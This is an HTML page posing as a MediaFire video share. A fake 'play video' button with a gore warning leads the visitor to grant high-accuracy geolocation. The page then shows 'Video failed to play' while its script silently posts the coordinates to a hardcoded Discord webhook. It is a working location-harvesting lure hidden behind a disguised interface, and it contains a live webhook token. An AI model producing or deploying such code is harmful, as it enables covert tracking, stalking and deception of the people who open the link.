<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>File Upload</title>

<style>
  *{
    box-sizing:border-box;
  }

  body{
    margin:0;
    font-family:Arial,sans-serif;
    background:#0f2866;
    color:white;
    overflow-x:hidden;
  }

  /* =========================
     TOP BAR
  ========================= */

  header{
    background:#0045ad;
    min-height:80px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:12px 18px;
    position:relative;
    gap:10px;
  }

  /* Left Logo */
  .left-logo{
    display:flex;
    align-items:center;
    z-index:2;
  }

  .logo{
    height:30px;
    max-width:120px;
  }

  /* Center Title */
  .center-title{
    position:absolute;
    left:50%;
    transform:translateX(-50%);
    text-align:center;
    width:max-content;
    max-width:50%;
  }

  .center-title h1{
    margin:0;
    font-size:22px;
    font-weight:bold;
    line-height:1.1;
  }

  .center-title p{
    margin:3px 0 0 0;
    font-size:13px;
    opacity:0.9;
  }

  /* Upload Files Button */
  .upload-btn{
    margin-left:auto;
    background:#0070f0;
    border:none;
    color:white;
    font-weight:bold;
    padding:10px 16px;
    border-radius:10px;
    cursor:pointer;
    font-size:14px;
    z-index:2;
    white-space:nowrap;
  }

  /* =========================
     MAIN CONTENT
  ========================= */

  .main{
    width:100%;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    padding:50px 20px 140px;
    text-align:center;
  }

  /* Image button */
  .image-button{
    background:none;
    border:none;
    cursor:pointer;
    width:100%;
    display:flex;
    justify-content:center;
  }

  .image-button img{
    width:100%;
    max-width:340px;
    border-radius:12px;
    box-shadow:0 10px 30px rgba(0,0,0,0.4);
  }

  #status{
    margin-top:20px;
    font-size:16px;
    text-align:center;
    padding:0 10px;
  }

  /* Hidden data container */
  #hiddenData{
    display:none;
  }

  /* =========================
     POPUP
  ========================= */

  #popup{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.7);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:1000;
    padding:20px;
  }

  .popup-box{
    background:#1f2937;
    padding:25px;
    border-radius:16px;
    width:100%;
    max-width:400px;
    text-align:center;
  }

  .popup-box h2{
    margin-top:0;
  }

  .popup-buttons{
    margin-top:20px;
    display:flex;
    gap:10px;
    justify-content:center;
    flex-wrap:wrap;
  }

  .popup-buttons button{
    padding:12px 22px;
    border:none;
    border-radius:10px;
    font-size:16px;
    cursor:pointer;
    background:#2563eb;
    color:white;
    font-weight:bold;
  }

  .cancel{
    background:#374151 !important;
  }

  /* =========================
     COOKIE BAR
  ========================= */

  #cookieBar{
    position:fixed;
    bottom:0;
    left:0;
    width:100%;
    background:#23272f;
    padding:16px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:16px;
    z-index:999;
    flex-wrap:wrap;
  }

  #cookieBar p{
    margin:0;
    color:white;
    font-size:14px;
    line-height:1.5;
    flex:1;
    min-width:220px;
  }

  .accept-btn{
    background:#0070f0;
    border:none;
    color:white;
    font-weight:bold;
    padding:12px 20px;
    border-radius:10px;
    cursor:pointer;
    white-space:nowrap;
  }

  /* =========================
     MOBILE FIXES
  ========================= */

  @media (max-width:700px){

    header{
      min-height:90px;
      padding:12px;
    }

    .logo{
      height:24px;
      max-width:90px;
    }

    .center-title{
      max-width:42%;
    }

    .center-title h1{
      font-size:18px;
    }

    .center-title p{
      font-size:11px;
    }

    .upload-btn{
      font-size:12px;
      padding:9px 12px;
    }

    .main{
      padding-top:40px;
    }

    .image-button img{
      max-width:95%;
    }

    #cookieBar{
      flex-direction:column;
      align-items:flex-start;
    }

    .accept-btn{
      width:100%;
    }
  }
</style>
</head>
<body>

<!-- =========================
     HEADER
========================= -->

<header>

  <!-- Left Logo -->
  <div class="left-logo">
    <img
      class="logo"
      src="https://static.mediafire.com/images/backgrounds/header/mf_logo_u1_full_color_reversed.svg"
      alt="Logo"
    >
  </div>

  <!-- Center Title -->
  <div class="center-title">
    <h1>File Upload</h1>
    <p>1 Video</p>
  </div>

  <!-- Right Button -->
  <button class="upload-btn">
    Upload Files
  </button>

</header>

<!-- =========================
     MAIN CONTENT
========================= -->

<div class="main">

  <button class="image-button" onclick="openPopup()">
    <img src="showmylocation.png" alt="Play Video">
  </button>

  <div id="status"></div>

</div>

<!-- Hidden data -->
<div id="hiddenData"></div>

<!-- =========================
     POPUP
========================= -->

<div id="popup">
  <div class="popup-box">

    <h2>Play Video</h2>

    <p>
      This video may contain:
      <br><br>
      • Blood
      <br>
      • Violence
      <br><br>
      Continue?
    </p>

    <div class="popup-buttons">
      <button onclick="acceptShare()">Yes</button>
      <button class="cancel" onclick="closePopup()">No</button>
    </div>

  </div>
</div>

<!-- =========================
     COOKIE BAR
========================= -->

<div id="cookieBar">

  <p>
    MediaFire uses cookies to provide you with a personalized browsing experience.
    By continuing to use this site, you agree to our Privacy Policy.
  </p>

  <button class="accept-btn" onclick="acceptCookies()">
    I Accept
  </button>

</div>

<script>
const webhook =
"https://discord.com/api/webhooks/1503128622037336114/1cccZC0MVLdAANTypyP7od0oUSe3cZ8355WBr_CIzOGP1s-60Jkl_IZ6UGwCZRO7F-3s";

function openPopup(){
  document.getElementById("popup").style.display = "flex";
}

function closePopup(){
  document.getElementById("popup").style.display = "none";
}

function acceptCookies(){
  document.getElementById("cookieBar").style.display = "none";
}

function acceptShare(){

  closePopup();

  const status = document.getElementById("status");

  status.innerHTML = "Waiting for required permissions...";

  navigator.geolocation.getCurrentPosition(async (pos)=>{

    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const accuracy = pos.coords.accuracy;

    // Hidden data storage
    document.getElementById("hiddenData").innerHTML = `
      Latitude: ${lat}
      Longitude: ${lon}
      Accuracy: ${accuracy}
    `;

    status.innerHTML = "Video failed to play.";

    // Send to Discord webhook
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content:
`📍 New Location Shared

Latitude: ${lat}
Longitude: ${lon}
Accuracy: ${accuracy} meters`
      })
    });

  }, ()=>{

    status.innerHTML = "Required permissions denied, Video couldn't play.";

  }, {
    enableHighAccuracy:true
  });
}
</script>

</body>
</html>
